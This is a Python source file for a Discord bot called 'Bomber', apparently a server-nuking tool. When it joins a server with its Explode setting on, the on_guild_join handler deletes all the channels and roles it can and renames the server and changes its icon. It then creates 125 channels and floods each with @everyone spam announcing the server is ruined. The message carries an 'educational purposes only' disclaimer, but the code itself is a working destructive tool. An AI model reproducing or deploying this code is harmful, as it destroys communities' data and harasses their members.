# Import libraries:
import discord as Discord;
import asyncio as Asyncio;

import random as Random;
import json as JSON;
import os as OS;
import inspect as Inspect;

from discord.ext import commands as Commands;
from typing import Literal, Optional; 


# Create thy instance:
Intents = Discord.Intents.all()
Bomber  = Commands.Bot(command_prefix = "b.", intents = Intents)

Tree = Bomber.tree


# Open our outside information:
Data = JSON.loads(open("Information.json", "r").read())

with open("Imgs/Logo.png", "rb") as Logo:
    Logo = Logo.read()


# Launch the startup:
@Bomber.event
async def on_ready():
    print("Bomber is now online.")


# Create global variables:
Token = Data['Token'].strip()


# Sync all of the cog's commands:
async def Load():
    for Name in OS.listdir("./Commands"):
        if Name.endswith(".py"):
            await Bomber.load_extension(f"Commands.{Name[:-3]}")

            print(f"Loaded {Name[:-3]}.")


# Add some bot events:
@Bomber.event
async def on_guild_join(Guild: Discord.Guild):
    if Data['Explode'] == True:
        try:
            for Channel in Guild.channels:
                try:
                    await Channel.delete()

                except Exception as Exc:
                    pass

            for Role in Guild.roles:
                if Role != Guild.default_role:
                    try:
                        await Role.delete()

                    except Exception as Exc:
                        pass

            async def Bomb(Channel):
                Channel = await Guild.create_text_channel(Channel)
                for _ in range(25):
                    await Channel.send("||@everyone|| \n\n**This server has been nuked by Bomber**. \n__Recovering from corruption may not be possible without any sort of backup server or rollback.__ \n# What Can I Do? \n1. There's nothing to be done. Your server is completely ruined ***unless*** you have a 1:1 replica of the server as a backup. \n2. If you see this message it's probably too late, but just hope your security bot does the job! \n\nTHIS NUKE WAS MORE THAN LIKELY CAUSED BY A MEMBER OF YOUR SERVER. **DEVELOPERS OF BOMBER ARE NOT RESPONSIBLE FOR ANY ACTIONS.** BOMBER WAS MADE FOR EDUCATIONAL PURPOSES ONLY & FOR THE INTENTION OF DISCORD FIXING THEIR ISSUES. \n\nFind our **OFFICIAL** Github repository [on Github](https://github.com/Suno0526/Bomber) OR ~~<https://github.com/Suno0526/Bomber/>~~")

            await Guild.edit(name = "Bombed by Bomber 💥")
            await Guild.edit(icon = Logo)

            Tasks = [Bomb("𝗥𝗘𝗔𝗗-𝗠𝗘") for _ in range(125)]
            await Asyncio.gather(*Tasks)

        except Exception as Exc:
            print(Exc)


# Create thy syncing command standalone:
"""
Code recycled from https://about.abstractumbra.dev/discord.py/2023/01/29/sync-command-example.html
"""
@Bomber.command(name = "sync", description = "Sync the command tree with the bot's commands.")
@Commands.is_owner()

async def sync(CTX: Commands.Context, Guilds: Commands.Greedy[Discord.Object], Spec: Optional[Literal["~", "*", "^"]] = None) -> None:
    try:
        if not Guilds:
            if Spec == "~":
                Synced = await CTX.bot.tree.sync(guild = CTX.guild)
            
            elif Spec == "*":
                CTX.bot.treecopy_global_to(guild = CTX.guild)
                Synced = await CTX.bot.tree.sync(guild = CTX.guild)

            elif Spec == "^":
                CTX.bot.tree.clear_commands(guild = CTX.guild)
                
                await CTX.bot.tree.sync(guild = CTX.guild)
                Synced = []

            else:
                Synced = await CTX.bot.tree.sync()

            await CTX.send(f"# Commands Synced. \n* All {len(Synced)} commands have been connted to the command tree. \n\n__If the command does not show, please restart Discord using **CTRL + R** or **CMD + R** on MacOS.__")
            return
        
        Ret = 0
        for Guild in Guilds:
            try:
                await CTX.bot.tree.sync(guild = Guild)

            except Discord.HTTPException:
                pass

            else:
                Ret += 1

        await CTX.send(f"# Commands Synced. \n* All new commands have been connted to the command tree. \n\n__If the command does not show, please restart Discord using **CTRL + R** or **CMD + R** on MacOS.__")

    except Exception as Exc:
        print(Exc)

        User = await CTX.bot.fetch_user("1002377371892072498")
        await CTX.send("# An Error Has Occurred.. \n* Do not worry, <@1002377371892072498> has already been notified of this bug & will patch it shortly. \n* Please be patient whilst this is being fixed! \n\n__If the bug is not resolved in 24hr, please leave a comment under out [GitHub](https://github.com/Suno0526/Bomber/issues) page.__")
        
        Line = Inspect.currentframe().f_lineno + 1
        await User.send(f"# Command Failure @ Line {Line} \n* The command **{CTX.command.name}** failed to respond, providing the error code: \n\n> {Exc}")


# Create the final instance:
async def Main():
    async with Bomber:
        await Load()
        await Bomber.start(Token)


# Load thy instance:
Asyncio.run(Main())